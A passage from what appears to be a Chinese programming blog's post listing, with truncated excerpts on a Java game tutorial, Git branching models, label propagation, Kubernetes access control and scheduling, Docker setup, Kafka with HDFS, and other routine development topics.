你需要什么 Kree v1.9或最新版本 Eclipse IDE 您将学到什么 创建场景 创建一个游戏对象 向游戏对象添加组件 从用户那里获取输入 创建自定义组件 创造球员运动 使用Kree产生随机数 检测碰撞 制备 设置您的Java项目并将Kree添加到您的构建路径 创建一个名为避免的包 还请参见： Java 15：密封的类使Valhalla更近了一步 创建启动器类 package avoid;import dev.jabo.kree.Game;import dev.jabo.kree.Window;public class Launcher {public static void main(String[] args) {Window window = new Window("Avoid the Enemy", 800, 600);Game game = new Game(window);game.start();}} 在这一节课中，我们将添加主课。 在第11行中，我们将为窗口创建一个实例，该实例带有3个参数，分别是窗口标题，窗口宽度和窗口高度。 在第12行中，我们将为我们的Game创建一个实例，该实例采用Window参数。 在Game类中，所有操作（例如游戏循环，用户输入等）都将在此开始。 最后，我们有game.start()它将触发游戏的开始。 创建场景 在Kree中创建场景非常简单。 package avoid;import java.awt.Graphics;import dev.jabo.kree.Game;import dev.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/209567a3e51e3057c53f592b9879bd87/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b0482ac9c49f4c7096558fb6c6168c39/" rel="bookmark">
			Android开发 - 收藏集
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Android 自定义View的各种姿势1
Activity的显示之ViewRootImpl详解
Activity的显示之ViewRootImpl初探
Activity的显示之Window和View
Android系统的创世之初以及Activity的生命周期
图解Android事件分发机制（深入底层源码）
Android 自定义View的各种姿势2
Android 内存泄漏分析与解决
Android消息机制
Android Binder（也许是最容易理解的）
Android 彻底掌握Binder
Android序列化
Android Fragment详解
Android Fragment最佳实践
Android TabLayout+ViewPager+Fragment
Android ListView
Android RecyclerView
Android ListView与RecyclerView项目实战
Android 动画
Android 动画(续)
Android HTTP
首个hybird商业项目踩坑总结
Android并发编程 开篇
Android并发编程 多线程与锁
Android并发编程 原子类与并发容器
SystemServer启动过程（framework）
ListView复用View原理分析
Android创建绑定服务的3种方法
管理应用内存
DecorView显示过程
Activity setContentView过程分析
VelocityTracker用法
Android中View的测量measure过程
Android WatchDog原理分析
Android事件传递流程-从ViewRootImpl到View
ViewManager接口分析
Android平台开源log工具-Logger
Android进程优先级和oom_adj
使用gradle减少apk大小
Zyote启动之framework
常见的apk签名方式
Volley源码分析
SystemServer启动过程（native）
Context、Application和ActivityThread
AndroidManifest.xml中applicaiton属性介绍
Android播放器音乐信息乱码及其解决方法
Zygote启动之native
管理 Activity 生命周期
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b0482ac9c49f4c7096558fb6c6168c39/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/aa4b235bae7d114370e4b32974621a8f/" rel="bookmark">
			* ./cptable in ./node_modules/xlsx-style/dist/cpexcel.js
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		* ./cptable in ./node_modules/xlsx-style/dist/cpexcel.js
vue.config.js中如此这般修改
const CompressionPlugin = require("compression-webpack-plugin") module.exports = { publicPath: process.env.NODE_ENV === 'production' ? '/' : '/', configureWebpack: () =&gt; { var obj = { externals: { './cptable': 'var cptable', '../xlsx.js': 'var _XLSX' } }; if (process.env.NODE_ENV == "production") { obj.plugins = [ new CompressionPlugin({ test: /\.js$|\.html$|\.css/, threshold: 10240, deleteOriginalAssets: false }), ]; } return obj; }, } 参照;
https://stackoverflow.com/questions/54306961/getting-error-for-xlsx-style-after-entering-command-yarn-start
https://www.programmersought.com/article/4000147640/
https://github.com/protobi/js-xlsx/issues/78
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/291e3a9ec8e37bd77124e655533d3c73/" rel="bookmark">
			如何选择 Git 分支模式？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		简介：编写代码，是软件开发交付过程的起点，发布上线，是开发工作完成的终点。代码分支模式贯穿了开发、集成和发布的整个过程，是工程师们最亲切的小伙伴。那如何根据自身的业务特点和团队规模来选择适合的分支模式呢？本文分享几种主流 Git 分支模式的流程及特点，并给出选择建议。 分支的目的是隔离，但多一个分支也意味着维护成本的增加。我们可以分别从开发和发布分支的多寡，做个简单组合，即：
主干开发，主干发布。分支开发，主干发布。主干开发，分支发布。分支开发，分支发布。 设想两个不同的场景：
如果一个软件，只有一个开发者，只需要一个发布版本，那他需要什么样的分支模式？如果一个软件，有 10 位开发者，需要支持多个版本，那他们又需要什么样的分支模式？ 一个好的分支模式，可以大大提高软件的开发、集成和发布效率。选择什么样的分支策略，是每一个开发团队开始工作时面临的第一个问题。那么，选择什么样的分支模式才适合我们呢？在回答这个题之前，我们先了解一下几种常见的分支模式。
主流的分支模式 常见的分支模式有 TBD（即主干开发模式）、Git-Flow 模式、Github-Flow 模式及 Gitlab-Flow 模式。
TBD（主干开发模式） 即所有开发者，仅在一个开发分支（即主干）上进行协作开发的模式，在这种模式下，不允许新建任何长期存在的开发分支，有且仅保留主干分支进行开发协作。
因为没有长期分离的其他开发分支，任何代码变更持续地更新到主干上，在一定程度上避免了 merge 代码带来的困扰。同时，在这种开发模式下，建议采用发布分支的策略，根据软件版本的发布节奏拉出发布分支。在 TBD 模式下，所有的修改都是在主干上，哪怕是缺陷的修改也是，修改完缺陷后，再 cherry pick 到发布分支上。
其特点总结一下就是：
有且仅有一个开发分支，即主干分支。所有改动都发生在主干分支。发布可以从主干拉发布分支。主干上进行的修复需要根据缺陷的修复策略，确定是否 cherry pick 到对应版本的发布分支。 因为团队共享一个开发分支，并且在开发分支上进行集成验证，而每次代码提交都会触发集成验证，这就要求每次代码的变更在主干上都能快速地验证，以确定是否接受下一次代码变更（每次代码变更都应该基于前一个稳定的版本进行），为了保证主干一直处在可工作状态，这就需要：
每一次的变更要小，这样在验证的过程中才能控制范围。快速完成验证，这就要求有相对完善的自动化检查验证机制。 所以，主干开发模式可以说是持续集成的关键推动者。主干开发模式非常利于持续集成，并且根据稳定和主干基线，做到随时发布，以达到持续交付。但这些是建立在团队成熟的协作能力和相对成熟的工程配套的基础上，快速地对主干的变更提交完成编译、检查及验证；同时，因为采取发布分支的实践方式，在产品版本、分支、部署场景的对应关系需要梳理清楚，避免发布分支混乱，及缺陷修改在各分支上的修复策略。
因为主干开发要求每次变更提交都要小，并且要快速验证完，保证主干是处在可发布状态。对于一些处在开发过程中的特性，如每次变更提交，并非意味着完整特性的完成，为了隔离“特性半成品”对主干的影响，一般会采用特性开关（Feature Toggle）的方式进行隔离。即频繁的代码变更提交，可以先做集成及验证，但是在发布的角度，通过（Feature Toggle）先隐藏相关特性，只有当特性都完成之后，才打开开关，特性完全透出。
但是，特性开关的引入也并不是没有成本，因为特性开关是配置，本质上跟我们常常用到的宏定义（#if #else）没啥区别，从本质上，它也是一种代码的分支。特性开关的使用，在一定程度上让你的代码变得更脆弱。所以，特性开关的使用，是建立在良好的代码设计基础上。
为了弥补诸如特性开关这样针对某个特性开发的需要，而且现在软件开发中，越来越多的团队共同协作在一起完成某一个特性这样的场景，一种针对特性开发的分支模式就应运而生，这就是特性分支开发模式，最有代表性的就是 Git-Flow。
Git-Flow Git-Flow 是为了解决多个不同特性之间并行开发需要的一种工作方式。当开始一个特性的开发工作的时候，从主干上拉出一个特性分支，所有的关于该特性的开发工作都发生在这个特性分支上，当完成该特性的工作之后，再把特性分支合并回代码主路径上，并准备发布。
Git-Flow 有以下几种分支：
feature 分支：开发者进行功能开发的分支。develop 分支：对开发的功能进行集成的分支。release 分支：负责版本发布的分支。hotfix 分支：对线上缺陷进行修改工作的分支。master：保存最新已发布版本基线的分支。 每个特性都有属于自己的开发分支，即 feature 分支，当一个开发者需要在两个特性上进行工作的时候，他需要做的是通过 check out 命令在两个分支之间进行切换。这样做的目的是防止开发过程中，两个特性开发工作的相互干扰。
特性开发过程中，需要针对该特性进行单独验证，当该特性并验证通过之后，merge 到一个叫做 develop 分支（大部分时间与 master 分支相近）的集成分支中，对整个软件进行验证。develop 分支永远保存都是最近的未发布版本，当 develop 分支的代码被验证可发布之后，单独从 develop 分支拉出 release 分支进行发布。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/291e3a9ec8e37bd77124e655533d3c73/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1aa1a492a742b7c6c84a854c4cb9ff63/" rel="bookmark">
			标签传播算法解读
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		2020-07-08 11:00:08
作者：Vijini Mallawaarachchi
编译：ronghuaiyang
导读 基于图的标签传播算法的简单介绍。
社交媒体网络已经遍布全球，并且每天都在增长。对于一个社交网络，你知道一些人的兴趣，你想预测其他人的兴趣，这样我们就可以有针对性地进行营销活动。为此，我们可以使用叫标签传播的基于图的半监督机器学习技术。在本文中，我将通过一些示例和示例代码解释标签传播过程。
什么是标签传播？ 标签传播算法(LPA)是一种迭代算法，通过在数据集中传播标签，将标签分配给未标记的点。该算法由Xiaojin Zhu和Zoubin Ghahramani于2002年首次提出。LPA属于转换学习，因为我们要预测已经给出的未标记数据点的标签。
假设我们有一个如下所示的网络，其中有两个标签类“interested in cricket”（对板球感兴趣）和“not interested in cricket”（对板球不感兴趣）。所以问题是，我们能预测剩下的人是否对板球感兴趣吗？
为了让LPA在这种情况下起作用，我们需要做一个假设，通过边连接的两个节点的边具有相似性。也就是说，如果两个人是连在一起的，这意味着这两个人很有可能拥有相同的兴趣。我们可以做出这样的假设，因为人们倾向于与有相似兴趣的人交往。
在图中随机游走 考虑图1中给出的示例图，其中我们有2个标签类(红色和绿色)和4个着色的节点(每个类2个)。我们想预测节点4的标签。
图1，示例图
我们可以在图中随机行走，从节点4开始，直到遇到任何标记节点。当我们到达一个标记节点时，我们停止游走。因此，这些标记的节点被称为吸收状态。让我们考虑所有可能的从节点4出发的路径。在所有可能的路径中，以下路径将以绿色节点结束。
4 → 9 → 15 → 164 → 9 → 13 → 144 → 9 → 13 → 15 → 164 → 9 → 15 → 13 → 14 下面的路径以红色的节点结束。
4 → 7 → 84 → 7 → 6 → 5 → 14 → 5 → 14 → 5 → 6 → 7 → 84 → 2 → 1 基于从节点4开始的所有可能的随机游走，我们可以看到大多数的游走都以红色节点结束。我们可以把结点4涂成红色。这是LPA背后的基本直觉。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/1aa1a492a742b7c6c84a854c4cb9ff63/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1a058543cb067965d9bea6c408b17273/" rel="bookmark">
			Kubernetes访问控制
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Kubernetes访问控制 kubernetes API 访问控制
Authentication(认证)
认证方式现共有8种,可以启用一种或多种认证方式,只要有一种认证方式通过,就不再进行其它方式的认证。通常启用X509 Client Certs和Service Accout Tokens两种认证方式。Kubernetes集群有两类用户:由Kubernetes管理的Service Accounts (服务账户)和(Users Accounts) 普通账户。k8s中账号的概念不是我们理解的账号,它并不真的存在,它只是形式上存在。 Authorization(授权)
必须经过认证阶段,才到授权请求,根据所有授权策略匹配请求资源属性,决定允许或拒绝请求。授权方式现共有6种,AlwaysDeny、AlwaysAllow、ABAC、RBAC、Webhook、Node。默认集群强制开启RBAC。 Admission Control(准入控制)
用于拦截请求的一种方式,运行在认证、授权之后,是权限认证链上的最后一环,对请求API资源对象进行修改和校验。 访问k8s的API Server的客户端主要分为两类:
kubectl :用户家目录中的 .kube/config 里面保存了客户端访问API Server的密钥相关信息,这样当用kubectl访问k8s时,它就会自动读取该配置文件,向API Server发起认证,然后完成操作请求。pod:Pod中的进程需要访问API Server,如果是人去访问或编写的脚本去访问,这类访问使用的账号为:UserAccount;而Pod自身去连接API Server时,使用的账号是:ServiceAccount,生产中后者使用居多。 kubectl向apiserver发起的命令,采用的是http方式,其实就是对URL发起增删改查的操作。
kubectl proxy --port=8888 &amp; curl http://localhost:8888/api/v1/namespaces/default curl http://localhost:8888/apis/apps/v1/namespaces/default/deployments 以上两种api的区别是:
api它是一个特殊链接,只有在核心v1群组中的对象才能使用。apis 它是一般API访问的入口固定格式名。 UserAccount与serviceaccount:
用户账户是针对人而言的。 服务账户是针对运行在 pod 中的进程而言的。用户账户是全局性的。 其名称在集群各 namespace 中都是全局唯一的,未来的用户资源不会做 namespace 隔离, 服务账户是 namespace 隔离的。通常情况下,集群的用户账户可能会从企业数据库进行同步,其创建需要特殊权限,并且涉及到复杂的业务流程。 服务账户创建的目的是为了更轻量,允许集群用户为了具体的任务创建服务账户 ( 即权限最小化原则 )。 创建serviceaccount:
kubectl create serviceaccount admin kubectl describe sa admin ##此时k8s为用户自动生成认证信息,但没有授权 添加secrets到serviceaccount中
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/1a058543cb067965d9bea6c408b17273/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/dd24f615b85557bf89119c84a653be85/" rel="bookmark">
			Kubernetes调度
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Kubernetes调度 调度器通过 kubernetes的watch机制来发现集群中新创建且尚未被调度到Node上的Pod。调度器会将发现的每一个未调度的Pod调度到一个合适的Node上来运行。
kube-scheduler是Kubernetes集群的默认调度器,并且是集群控制面的一部分。如果你真的希望或者有这方面的需求,kube-scheduler 在设计上是允许你自己写一个调度组件并替换原有的 kube-scheduler。
在做调度决定时需要考虑的因素包括:单独和整体的资源请求、硬件/软件/策略限制、亲和以及反亲和要求、数据局域性、负载间的干扰等等。
默认策略可以参考: https://kubernetes.io/zh/docs/concepts/scheduling/kube-scheduler/
调度框架: https://kubernetes.io/zh/docs/concepts/configuration/scheduling-framework/
nodeName nodeName是节点选择约束的最简单方法,但一般不推荐。如果 nodeName 在PodSpec 中指定了,则它优先于其他的节点选择方法。
示例：
apiVersion: v1 kind: Pod metadata: name: nginx spec: containers: - name: nginx image: reg.harbor.com/library/nginx nodeName: server3 nodeName 选择节点的限制:
如果指定的节点不存在。如果指定的节点没有资源来容纳 pod,则pod 调度失败。云环境中的节点名称并非总是可预测或稳定的。 nodeSelector nodeSelector 是节点选择约束的最简单推荐形式。
给选择的节点添加标签:
kubectl label nodes server2 disktype=hdd ##通过label来给节点打上标签 添加 nodeSelector 字段到 pod 配置中:
apiVersion: v1 kind: Pod metadata: name: nginx labels: env: test spec: containers: - name: nginx image: reg.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/dd24f615b85557bf89119c84a653be85/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/921c3ac525b0720d27160ab393ba69aa/" rel="bookmark">
			Navicat查看远程数据库
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		导入数据库
连接
主机输入服务器ip地址 端口也记得改 用户名 密码 这些springboot yml配置文件有
可视化表
右击数据库
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6b364d8fcd6c0dc566f859295d2098ff/" rel="bookmark">
			jmc线程转储_查找线程转储中的异常和错误
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		jmc线程转储
线程转储是解决生产问题/调试生产问题的重要工件。 在像过去我们已经讨论了几种有效的线程转储故障模式： 堵车 ， 跑步机 ， RSI ， 一个 LL条条大路通罗马 .........。 在本文中，我们想介绍另一种线程转储故障排除模式。 How to capture thread dumps? There are 8 different options to capture thread dumps. You can use the option that is convenient to you. dumps. You can use the option that is convenient to you. 线程转储通常在线程堆栈跟踪中包含异常或错误。 应该检查在其堆栈跟踪中包含异常或错误的线程。 因为它们指出了问题的根源。 最近，一个应用程序引发了java.lang.OutOfMemoryError。 从此应用程序捕获了线程转储。 当我们分析线程转储时，我们会注意到一个特定的线程正在抛出java.lang.OutOfMemoryError： Thread 0x3ff781e764e0 at java.lang.OutOfMemoryError.&lt;init&gt;()V (OutOfMemoryError.java:48) at java.lang.ClassLoader.defineClass1(Ljava/lang/String;[BIILjava/security/ProtectionDomain;Ljava/lang/String;)Ljava/lang/Class; (Native Method) at java.lang.ClassLoader.defineClass(Ljava/lang/String;[BIILjava/security/ProtectionDomain;)Ljava/lang/Class; (ClassLoader.java:757) at java.lang.ClassLoader.defineClass(Ljava/lang/String;[BII)Ljava/lang/Class; (ClassLoader.java:636) at sun.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/6b364d8fcd6c0dc566f859295d2098ff/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1e5f6b15e35405418d72bfb9ad3ff181/" rel="bookmark">
			解决adb报5037问题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		配置环境变量--新建
ANDROID_ADB_SERVER_PORT
值 5038
然后重启一下电脑
就可以了，不会出现5037的问题
adb devices找不到设备有很多的原因，需要根据不同的现象解决，例如：
首先你的adb需要安装好，环境变量配置好，具体步骤请参考网页链接；
你的Android设备驱动需要安装好，也就是说设备管理器中需要能正确识别到你的设备，驱动安装方法详见网页链接；
驱动已经安装过了，但设备管理器中显示设备前有黄色警告，一个电脑上各种Android设备用的多了，就很容易出现这种情况，这时请参考网页链接解决；
如果电脑安装了一些手机管理软件，那adb 5037端口很容易被占用，这时请参考网页链接解决；
如果设备管理器中看起来驱动安装好了，端口也没有被占用，那有可能时设备VID缺失，请参考网页链接解决；
手机中的“USDB debug”必须打开；
USB线不太老化，不然很容易出现adb offline。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/058499680147e7a52a5f19ac89d84e8a/" rel="bookmark">
			jvm与非jvm语言优劣_JVM语言的兴衰
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		jvm与非jvm语言优劣
时不时有一篇文章预测Java语言的消亡。 有趣的是，他们都没有写日期。 但老实说，它们可能都是真实的。 这是每种语言的命运：消失于遗忘-或更确切地说，越来越少地用于新项目。 问题是什么将取代它们？ 上周在InfoQ上看到了另一篇这样的文章。 至少，这个告诉了一个可能的替代者，Kotlin。 这让我开始思考JVM语言的状态和趋势。 请注意，趋势与每种语言的技术优缺点无关。 我从2001年底开始使用Java进行开发。那时，Java非常酷。 每个年青的开发人员都想开发所谓的新技术：.Net或Java，因为年长的开发人员被Cobol所困扰。 我在学校学习过C和C ++，使用Java进行内存管理非常容易。 我对Java感到满意...但并非所有人都满意。 Groovy于2003年问世。我不记得是什么时候知道它的。 我只是忽略了它：那时我不需要脚本语言。 在与许多开发人员组成的团队一起开发使用寿命长的企业级应用程序的情况下，静态类型比动态类型具有巨大的优势。 必须创建测试来检查类型系统是一个净损失。 我唯一需要创建脚本的时间是作为WebSphere管理员：在Python和TCL之间进行选择。 一年后的2004年， Scala被接受。我不记得何时，如何得知它的，但是那是很晚了。 但是与Groovy相反，我决定尝试一下。 主要原因是我长期以来对创建“更好的”代码的兴趣-阅读起来更具可读性和可维护性。 Scala是静态类型的，这更多的是我在寻找的东西。 我遵循了Scala的Coursera课程《函数编程原理》 。 它具有三个主要结果： 它质疑我编写Java代码的方式。 例如，为什么在设计类时自动生成getter和setter方法？ 我认为Scala使得大多数开发人员（包括我自己）编写不易读的代码变得太容易了 我开始寻找其他替代语言 之后Groovy和斯卡拉来到第二代（3 次 ，如果算上Java作为第一）JVM语言，其中包括： 捷豹Kotlin 锡兰红帽酒店 和Eclipse Xtend 随便看了他们一眼，我就确信他们没有太多的吸引力，也不值得花我的时间。 几年前，我决定自学基本的Android，以了解移动开发人员的开发环境。 好家伙！ 经过多年的Java EE和Spring应用程序开发，这是一个惊喜-也不是一件令人愉快的事情。 就像过去十年被倒退了一样。 Android API的级别太低了......更不用说在本地测试应用程序了。 快速浏览后，我发现很多地方都提到了Kotlin，最后决定尝试一下。 我立即坠入爱河：有了Kotlin，借助扩展功能，我可以将现有的废话API改进为更好甚至更好的东西。 我进一步研究了该语言，并开始将Kotlin用于服务器端项目。 然后，Spring框架宣布了Kotlin的集成。 在Google I / O上，Google宣布在Android上支持Kotlin。 这篇文章是关于我个人的经历和由此形成的观点。 如果您更喜欢只阅读您同意的帖子，请随时停止阅读这一点。 除了我自己的经验之外，这些语言的当前状态如何？ 我在Google趋势上进行了快速搜索 。 有一些有趣的事情要注意： 谷歌已经认识到搜索词即 “编程语言”为斯卡拉，Groovy和Kotlin，而不是锡兰和扩展。 对于锡兰，我只能假设是因为锡兰是一个受欢迎的地方。 对于eXtend，恐怕Google搜索量不足。 到目前为止，Scala最受欢迎，其次是Groovy和Kotlin。 我没有关于规模的真正线索。 五月份的Kotlin高峰与Google在Google I / O上的支持声明有关。 对于Scala和Kotlin的大多数搜索都来自中国，Groovy在地理位置方面更为平衡。 Scala搜索与术语“ Spark”密切相关，Kotlin搜索与术语“ Android”相关。 进一步挖掘可能会发现有趣的事实： xTend尚未死，因为它从未存在过。 永远不要阅读任何有关它的文章。 也从未听过会议演讲。 2017年，红帽将Ceylon交给了Eclipse Foundation，创建了Eclipse Ceylon 。 向基金会捐赠软件的私人参与者可能会以不同的方式进行解释。 在这种情况下，尽管围绕此举进行了令人放心的谈判，但这对锡兰的未来并不是一个好兆头。 在2015年，Pivotal停止赞助Groovy，并将其转移到Apache基金会。 尽管我相信Groovy具有足够广泛的支持基础，并且在JVM上具有独特的优势-脚本编写，但这也不是一个好兆头。 这与核心Groovy 提交者的提交频率相关：它们的提交数量急剧减少-甚至停止了一些。 有趣的是，Scala和Kotlin最近都入侵了其他领域，转而使用JavaScript并编译为原生语言。 在Java中， JEP 286是通过类型推断来增强语言的建议，Scala和Kotlin已经提供了此功能。 但是，它仅限于局部变量。 有趣的是，人们正在努力通过仅保留一部分语言来缩短Scala编译时间 。 这就提出了一个问题：如果放弃Scala的强大功能（例如宏），为什么还要保留它呢？ 我的预测并不理想，但这里是我的2美分： Groovy有其自己的细分市场-脚本编写，它使Java，Scala和Kotlin争夺服务器端JVM上的纯应用程序开发空间。 Scala还雕刻了自己的空间。 Scala开发人员通常认为该语言优于Java（或Kotlin），因此不会迁移到另一种语言。 但是，由于Spring和Google的宣布，当开发人员对Java感到不满意时，Kotlin可能会取代Scala作为语言开发人员。 Kotlin赢得了Android之战。 由于Kotlin在游戏中遥遥领先，Scala过去忽略了这一领域，并且将来不会投资。 Kotlin在移动设备上的崛起并不是有意的举动，而是一个令人惊喜的意外惊喜。 但是，JetBrains在注意到趋势后立即将其用作前进的方向。 Kotlin与Java的互操作性是杀手级功能，可以说服经理人将遗留项目迁移到Kotlin或启动新项目。 就像对Java的不间断的向后兼容性一样。 亲爱的读者，即使您不同意以上内容，我也会非常感兴趣您的意见，甚至（尤其是？）。 请保持礼貌，并在可以证明观点时提供事实。 翻译自: https://blog.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/058499680147e7a52a5f19ac89d84e8a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/99e203098ca340f17dfd24c6d04e3c50/" rel="bookmark">
			Unity动态加载3D模型
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Unity动态加载3D模型 在Unity中创建游戏对象的方法有 3 种：
第一种是将物体模型资源由 Project 视图直接拖曳到 Hierarchy 面板中；第二种是在 Unity 3D 菜单 GameObject 中创建 Unity 3D 自带的游戏对象，如 Cube、Camera、Light 等；第三种是利用脚本编程，动态创建或删除游戏对象。 本文尝试采用第三种方法，即利用脚本动态加载3D模型文件，从而创建游戏对象。
网上搜索“Unity3d 动态加载fbx模型文件”，大部分都是对文章https://blog.csdn.net/ldkcumt/article/details/51098206的转载，先亲身做一下实践。
Unity版本：Unity 2018.3.7f1 (64-bit) 随VS2017一起安装。
方法一：
1 将模型拖动到场景中 ，调整好位置。（制作prefab预制体需要）
2 新建Resources（如果工程中有的话 就不用新建了，Resources.Load调用的就是该文件夹下的资源），在该文件夹下建一个prefab，将上面的模型拖动到这个prefab上
3 删除场景中的该物体模型
4 编写脚本，把它随便扔给一个GameObject
1 using System.Collections; 2 using System.Collections.Generic; 3 using UnityEngine; 4 5 public class LoadFBX : MonoBehaviour 6 { 7 public string url; 8 // Start is called before the first frame update 9 void Start() 10 { 11 GameObject gFbx = (GameObject)Instantiate(Resources.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/99e203098ca340f17dfd24c6d04e3c50/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ee9d5b0f48730e5cafbcf4a1ad3dae3d/" rel="bookmark">
			linux下docker使用大全
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		linux下docker使用大全
Docker 是一个开源的应用容器引擎，基于 Go 语言 并遵从 Apache2.0 协议开源。Docker 可以让开发者打包他们的应用以及依赖包到一个轻量级、可移植的容器中，然后发布到任何流行的 Linux 机器上，也可以实现虚拟化。容器是完全使用沙箱机制，相互之间不会有任何接口,更重要的是容器性能开销极低。
Docker 包括三个基本概念:
镜像（Image）：Docker 镜像（Image），就相当于是一个 root 文件系统。比如官方镜像 ubuntu:16.04 就包含了完整的一套 Ubuntu16.04 最小系统的 root 文件系统。
容器（Container）：镜像（Image）和容器（Container）的关系，就像是面向对象程序设计中的类和实例一样，镜像是静态的定义，容器是镜像运行时的实体。容器可以被创建、启动、停止、删除、暂停等。
仓库（Repository）：仓库可看成一个代码控制中心，用来保存镜像。
Docker CE 18.09在centos7的安装
关闭 防火墙
systemctl stop firewalld systemctl disable firewalld #查看防火墙状态
firewall-cmd --state 输出信息大概是这样的
!
关闭 SeLinux
建议在主机上禁用SELinux，让容器可以读取主机文件系统。或修改系统文件/etc/sysconfig/selinux，将SELINUX=enforcing修改成SELINUX=disabled，然后重启Linux。
关闭交换空间
关闭swap
swapoff -a yes | cp /etc/fstab /etc/fstab_bak cat /etc/fstab_bak |grep -v swap &gt; /etc/fstab free -m #配置iptable管理ipv4/6请求
vim /etc/sysctl.d/k8s.conf 添加
net.bridge.bridge-nf-call-ip6tables = 1 net.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ee9d5b0f48730e5cafbcf4a1ad3dae3d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/809d524a1f80d59b08c67ad3f05a4931/" rel="bookmark">
			Java实现kafka生产者与消费者并将消费后的消息写入HDFS
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、前期准备工作：
虚拟机已安装和基本配置好；Zookeeper已安装好；Kafka已安装好；Hadoop已安装好；
启动之后查看进程是否都起来了：
二、编写代码：
1、创建Maven工程并导入相关依赖：
&lt;dependency&gt; &lt;groupId&gt;org.apache.kafka&lt;/groupId&gt; &lt;artifactId&gt;kafka-clients&lt;/artifactId&gt; &lt;version&gt;0.9.0.0&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.apache.kafka&lt;/groupId&gt; &lt;artifactId&gt;kafka_2.11&lt;/artifactId&gt; &lt;version&gt;0.9.0.0&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.apache.hadoop&lt;/groupId&gt; &lt;artifactId&gt;hadoop-common&lt;/artifactId&gt; &lt;version&gt;2.7.0&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.apache.hadoop&lt;/groupId&gt; &lt;artifactId&gt;hadoop-client&lt;/artifactId&gt; &lt;version&gt;2.7.0&lt;/version&gt; &lt;/dependency&gt; 2、编写生产者类CustomProducer
import org.apache.kafka.clients.producer.KafkaProducer; import org.apache.kafka.clients.producer.ProducerRecord; import java.util.Properties; /** * @author：xsluo * @date：2020/7/9 * @aim：生产者：往topic666消息队列写入消息 */ public class CustomProducer { private static KafkaProducer&lt;String, String&gt; producer; private final static String TOPIC = "topic666"; public CustomProducer() { //定义配置信息 Properties props = new Properties(); // kafka地址，多个地址用逗号分隔 props.put("bootstrap.servers", "weekend110:9092,weekend01:9092,weekend02:9092"); props.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/809d524a1f80d59b08c67ad3f05a4931/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7f1065999072b6dec8bc9ea559ae7f76/" rel="bookmark">
			求e的近似值，面对数据溢出和数据异常1.#INF...
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		#include&lt;stdio.h&gt; #include&lt;math.h&gt; long f(long n); int main() { long n,i; double s = 1.0; double d; scanf("%ld",&amp;n); if(n &gt; 1000||n &lt; 0){ return 0; } for(i = n;i &gt; 0;i--){ d = 1.0/f(i); s += d; } printf("%.8lf",s); return 0; } long f(long n) { long i,f = 1; for(i = n;i &gt; 0;i--){ f *= i; } return f; } 出现1.#INF000情况： 可能1：对于条件端子的初始设置错误，出现了分母为零而使式子无意义的情况
可能2：变量被无限放大，超出了float或double能表示的范围
解决：换另一个变量进行保存
更改：
#include&lt;stdio.h&gt; double f(int n); int main() { int n,i; double s = 1.
	</div>
